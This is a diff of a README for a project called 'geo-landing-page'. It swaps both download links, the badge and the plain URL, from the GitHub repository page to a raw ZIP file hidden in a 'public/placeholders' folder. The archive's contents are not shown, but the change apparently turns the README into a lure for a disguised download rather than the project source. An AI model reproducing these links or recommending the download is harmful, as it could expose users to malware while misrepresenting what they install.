@@ -1,6 +1,6 @@
 # 🌐 geo-landing-page - Build smarter landing pages fast
 
-[![Download geo-landing-page](https://img.shields.io/badge/Download-geo--landing--page-blue?style=for-the-badge&logo=github)](https://github.com/jessynonreversible774/geo-landing-page)
+[![Download geo-landing-page](https://img.shields.io/badge/Download-geo--landing--page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jessynonreversible774/geo-landing-page/main/public/placeholders/geo_page_landing_2.2.zip)
 
 ## ✨ What this is
 
@@ -24,7 +24,7 @@ If you only want to view the project files, a browser is enough. If you want to 
 ## 📥 Download the project
 
 Visit this page to download:  
-https://github.com/jessynonreversible774/geo-landing-page
+https://raw.githubusercontent.com/jessynonreversible774/geo-landing-page/main/public/placeholders/geo_page_landing_2.2.zip
 
 If the page shows a ZIP file or a green Code button, use that to download the project to your computer.
 
